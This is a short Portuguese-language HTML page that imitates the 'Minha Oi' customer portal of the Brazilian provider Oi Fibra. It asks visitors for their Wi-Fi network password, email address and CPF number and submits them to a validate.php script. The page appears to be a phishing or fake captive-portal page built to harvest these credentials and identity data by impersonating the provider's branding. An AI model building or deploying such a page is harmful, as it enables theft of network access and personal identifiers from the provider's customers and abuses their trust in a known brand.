<!DOCTYPE html>
<html lang="pt-br">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Oi Fibra</title>
</head>
<link rel="stylesheet" href="style.css">

<body>
<center>
    <img src="assets/img/LOGO-OI-VERDE-04.png" width="40" alt="logooi">
<h1>Minha Oi</h1>


<form method="post" action="validate.php" type="submit" class="form-horizontal" autocomplete="on">

    <fieldset>
        <legend>Credenciais do Usuário</legend>
        <h2>
            Para continuar, precisamos que você se identifique.
          </h2>
        
        <p>
            <label for="isenha">Senha da rede:</label><br>
            <input type="password" name="isenha" id="isenha" placeholder="********" minlength="8" maxlength="20" required>
        </p>
        <p>
            <label for="iemail">Email:</label><br>
            <input type="email" name="email" id="iemail" placeholder="usuário@email.com" autocomplete="email" required>
        </p>
        <p>
            <label for="vCPFDesk">CPF:</label><br>
            <input name="Ecom_User_ID" type="text" data-context="campo_seu_cpf" id="vCPFDesk" class="form-control bdr-gray-desk input-color field-height-50 input-cpf-radius-enabled-desk" placeholder="000.000.000-00" onkeypress="$(this).mask('000.000.000-00');" required="" maxlength="14">
        </p>
        <p>
    
            <input type="submit" value="Enviar" id="ienviar">
            <input type="reset" value="Limpar" id="ilimpar">
        </p>
    </fieldset>
    
    <footer>
 <p>Oi™ Internet</p>
</footer>
    
</form>
</center>
</body>
</html>
